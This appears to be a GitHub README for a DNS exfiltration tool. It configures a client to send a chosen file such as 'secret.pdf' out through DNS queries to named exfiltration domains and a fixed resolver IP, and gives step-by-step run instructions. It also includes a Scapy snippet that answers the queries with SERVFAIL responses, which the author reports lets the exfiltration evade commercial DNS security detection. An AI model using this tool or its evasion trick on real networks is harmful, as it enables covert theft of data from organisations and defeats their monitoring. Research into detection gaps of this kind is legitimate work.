# DNS-Exfiltration
Mudik DNS Exfiltration</br>
![image](https://github.com/spatronn/DNS-Exfiltration/assets/27374567/98b43ade-ae4b-4e0f-83cd-d5c48c7e76eb)



<b>Change the parameter according to your environment:</b></br>
//Enter your DNS Resolver (client.py)</br>
dns_server = "3.253.51.115"</br>
//Specify the file you want to exfiltrate instead of secret.pdf (client.py)</br>
with open("secret.pdf", "rb") as pdf_file:</br>
//Define the domain or domains you will use in DNS Exfiltration. (client.py)</br>
domain_list = ["dnsmalwaredaddy.online","laleler-denemeler.top"]</br>


STEP-1</br>
Install requirements</br>
STEP-2</br>
Run server.py on your name server.Make sure that the DNS service is not running on this server.</br>
STEP-3</br>
Modified client.py according to your environment.</br>
STEP-4</br>
Run client.py</br>
STEP-5</br>
Once exfiltration is complete, run recreate_exfiltration_data.py to deduplicate and collect the data.</br>
STEP-6 Final</br>
We run decode_save_file.py to decode the file created in STEP-5 and access the original file.


<b>Explanation & Personal Notes</b></br>
Many DNS security providers claim they can detect DNS exfiltration. When testing various methods or examining test results, we often find that many of them indeed succeed in detecting it. However, I’m not entirely sure what’s happening behind the scenes. Could it be the high frequency of queries sent within a short time? Or perhaps the fact that queries and responses are flagged as NXDOMAIN within that interval? Maybe it’s when DNS queries with the same type (e.g., DNS A, DNS AAAA, DNS TXT, etc.) are sent to the same domain within a set timeframe and also return NXDOMAIN responses? It could even be the entropy score of the DNS queries falling above or below a certain threshold, the domain being newly observed, or being flagged in Domain Threat Intelligence. Or maybe it’s a combination of all these factors? I’m not certain.

However, during testing, I noticed an interesting anomaly. By generating a SERVFAIL response with Scapy and sending this response for all exfiltration DNS queries, DNS exfiltration oddly continues undetected. 

###################################################################################</br>
def reply_dns_fail_response (client_ip_addr,client_dport,client_dns_id,dns_qname,dns_query_type):
    reply_dns_fail_response = IP(id=RandShort(),dst=client_ip_addr)/UDP(sport=53, dport=client_dport)/DNS(id=client_dns_id,qr=1,rd=1,rcode=2,arcount=1,qd=DNSQR(qname=dns_qname,qtype=dns_query_type,qclass="IN")) / DNSRROPT(type="OPT",rclass=4000,version=0)
    send(reply_dns_fail_response,verbose=False)
###################################################################################

In this scenario, providers that claim to detect DNS exfiltration surprisingly fail to do so. Simply put, there’s a fire in the kitchen.</br>
![image](https://tammy.ai/_next/image?url=https%3A%2F%2Fi.ytimg.com%2Fvi%2FPnI1MhNuL3M%2Fhqdefault.jpg&w=640&q=75)</br>

https://datatracker.ietf.org/doc/html/rfc2929#section-2.3

Upon reviewing the RFC, we actually have many possible responses at our disposal. This case is not closed yet. To be continued...
